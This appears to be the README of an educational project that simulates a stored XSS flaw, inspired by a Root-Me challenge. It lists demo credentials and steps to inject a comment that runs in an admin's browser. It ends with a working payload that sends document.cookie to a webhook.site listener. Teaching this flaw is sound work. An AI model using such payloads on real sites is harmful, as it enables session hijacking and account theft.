# XSS Stored – Educational Demo Project

This project is a **simple educational demonstration of a Stored Cross-Site Scripting (XSS) vulnerability**, created to better understand how this vulnerability works in practice.

The scenario is inspired by the Root-Me challenge:

🔗 **XSS Stored – Web Client**
[https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)

##  Description

This application simulates a vulnerable web application where:

* A normal user can submit a comment
* User input is stored **without proper sanitization**
* An admin later views the stored comment
* A malicious payload executes in the admin’s browser context

This demonstrates how **Stored XSS** can lead to **session hijacking (cookie theft)**.

---

## Test Credentials

### Normal User

```
username: dyaech0
password: dyaech0
```

### Admin

```
username: 4dmin
password: 4dmin
```

---

##  Steps to Reproduce the Vulnerability

1. Navigate to:

   ```
   /login
   ```

2. Log in using **normal user credentials**.

3. You will be redirected to:

   ```
   /home.html
   ```

4. Inside the **comment box**, inject your XSS payload.

5. Close your browser window (or log out).

6. Navigate again to:

   ```
   /login
   ```

7. Log in using **admin credentials**.

8. You will be redirected to:

   ```
   /dashboard
   ```

9. If the payload was stored successfully, it will execute when the admin loads the page.

---

##  Cookie Hijacking (Optional)

If your payload includes **cookie exfiltration**, this behavior is expected and intentional in this demo project.

If you don’t have your own server to receive requests, you can use:

🔗 [https://webhook.site/](https://webhook.site/)

* Generate a unique endpoint
* Use it as a listener to capture stolen cookies

---

##  Example Stored XSS Payload (Cookie Hijacking)

You can use the following **proof-of-concept payload** to demonstrate cookie hijacking via Stored XSS:

```html
<img src="oops" onerror="document.write(`<img src='https://webhook.site/your-unique-url?cmd=${document.cookie}' />`)">
```
